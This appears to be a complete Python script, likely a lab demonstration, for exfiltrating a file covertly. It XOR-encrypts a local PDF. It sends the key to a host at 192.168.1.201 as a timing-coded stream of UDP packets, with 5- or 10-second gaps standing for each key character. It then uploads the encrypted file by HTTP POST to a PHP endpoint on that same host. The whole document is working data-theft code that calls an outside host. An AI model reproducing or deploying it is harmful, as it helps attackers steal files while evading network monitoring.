#!/usr/bin/python
'''
    To work you need two files a .pdf and a .crypt
'''

import random, os, requests, socket, time


def make_random_key(key_length):
    key = ''
    for index in range(key_length):
        key = key + ('A' if random.randint(0, 1) == 0 else 'B')
    return key

def encrypt_file(the_key):
    input_file = open('trash.pdf', 'rb')
    output_file = open('trash.crypt', 'wb')
    key_index = 0
    for byte in input_file.read():
        encrypted_byte = chr(ord(the_key[key_index]) ^ ord(byte))
        output_file.write(encrypted_byte)
        key_index = key_index + 1
        if key_index >= len(the_key):
            key_index = 0
    output_file.close()
    input_file.close()

def transmit_key(key):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind(('', 1234))
    s.sendto('START', ('192.168.1.201', 1234))
    for ch in key:
        delay = 5.0 if ch == 'A' else 10.0
        time.sleep(delay)
        s.sendto('SOMETHING', ('192.168.1.201', 1234))
    s.sendto('END', ('192.168.1.201', 1234))
    

def transmit_file():
    the_file = open('trash.crypt', 'rb')
    the_file_contents = the_file.read()
    the_file.close()
    req = requests.post('http://192.168.1.201:8000/trash.php', 
                        files={'trash.crypt': the_file_contents})


key = make_random_key(16)
encrypt_file(key)
transmit_key(key)
transmit_file()

